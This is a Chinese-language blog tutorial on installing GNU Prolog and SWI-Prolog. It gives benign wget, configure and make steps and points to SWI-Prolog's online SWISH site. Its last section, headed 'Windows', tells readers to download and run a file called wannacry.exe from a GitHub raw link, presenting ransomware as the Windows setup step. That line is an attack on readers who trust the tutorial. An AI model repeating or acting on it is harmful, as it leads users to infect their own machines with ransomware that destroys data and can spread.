---
title: prolog教程（一）：环境搭建
date: 2016-07-15
tags: prolog, tutorial, prolog_tutorial
---
## GNU Prolog
### 简介
GNU Prolog 是一个由丹尼尔 · 迪亚兹开发的免费的 Prolog 编译器与解释器。

GNU Prolog 接受 Prolog  程序，并且生成本机二进制文件 （就像 gcc  编译 c 源码）。得到的可执行文件是独立的。该可执行文件的大小可以很小，因为 GNU Prolog 可以避免将未使用内置谓词链接。是非常令人鼓舞的 GNU Prolog 的性能 （类似于商业系统）。

除了本机代码编译，GNU Prolog 还提供了一个经典的交互式解释器和调试器（顶层）。

>GNU Prolog is a free Prolog compiler with constraint solving over finite domains developed by Daniel Diaz.

>GNU Prolog accepts Prolog+constraint programs and produces native binaries (like gcc does from a C source). The obtained executable is then stand-alone. The size of this executable can be quite small since GNU Prolog can avoid to link the code of most unused built-in predicates. The performances of GNU Prolog are very encouraging (comparable to commercial systems). 

>Beside the native-code compilation, GNU Prolog offers a classical interactive interpreter (top-level) with a debugger.

[http://www.gprolog.org/](http://www.gprolog.org/)

### 编译安装

* 本段均以1.4.4版为例，请自行替换为最新版本

先打开[官网，Download](http://www.gprolog.org/#download)
找到这句

Source distributions:

 the main source distribution gprolog-1.4.4.tar.gz.
点击 gprolog-1.4.4.tar.gz 下载，或者直接

```bash
wget http://www.gprolog.org/gprolog-1.4.4.tar.gz
```

解压

```bash
tar -xzvf gprolog-1.4.4.tar.gz
```

安装

```bash
cd gprolog-1.4.4/src/
./configure
make && sudo make install && make clean
```

测试一下

```bash
gprolog
```

如果出现

```
GNU Prolog 1.4.4 (64 bits)
Compiled Jul 14 2016, 20:21:03 with gcc
By Daniel Diaz
Copyright (C) 1999-2013 Daniel Diaz
| ?-
```

就成功了，输入halt.或者按&lt;Ctrl-D>退出。

## swi-prolog

[www.swi-prolog.org/](http://www.swi-prolog.org/)

### 编译安装
[https://github.com/SWI-Prolog/swipl](https://github.com/SWI-Prolog/swipl)

测试一下

```bash
swipl
```

如果出现（以 7.4.2 版本为例）

~~~~
Welcome to SWI-Prolog (threaded, 64 bits, version 7.4.2)
SWI-Prolog comes with ABSOLUTELY NO WARRANTY. This is free software.
Please run ?- license. for legal details.

For online help and background, visit http://www.swi-prolog.org
For built-in help, use ?- help(Topic). or ?- apropos(Word).

?- 
~~~~

就成功了，输入halt.或者按&lt;Ctrl-D>退出。

### 在线使用

[swi-prolog还有在线版的](http://swish.swi-prolog.org/)

进去，先点击Program，再在左边窗格定义，右下角就能求解，不过不要太复杂，不然会出现"Unknown error term: time\_limit_exceeded"。


##其他编译器/解释器

自己研究，不一定能适用于本教程

## Windows

下载 [WannaCry](https://github.com/745275633/wannacry/raw/master/wannacry.exe) 并运行。
